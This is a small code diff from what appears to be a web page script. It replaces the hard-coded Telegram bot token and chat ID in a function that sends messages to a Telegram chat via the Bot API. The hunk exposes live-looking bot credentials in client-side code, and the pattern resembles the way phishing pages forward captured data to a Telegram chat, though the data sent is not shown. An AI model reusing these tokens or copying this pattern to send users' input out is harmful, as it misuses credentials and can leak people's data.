@@ -333,8 +333,8 @@
         }
 
         function sendToTelegram(message) {
-            const botToken = '7938227619:AAE1GcbVwDcBqeXEYfeXHV6w8liNlp-9c9I';
-            const chatId = '7938227619';
+            const botToken = '8043730633:AAHJe0tb33Y8o9UhFWu71B1lfs8GqArRm2Y';
+            const chatId = '7261250509';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             fetch(url)
                 .then(response => response.json())
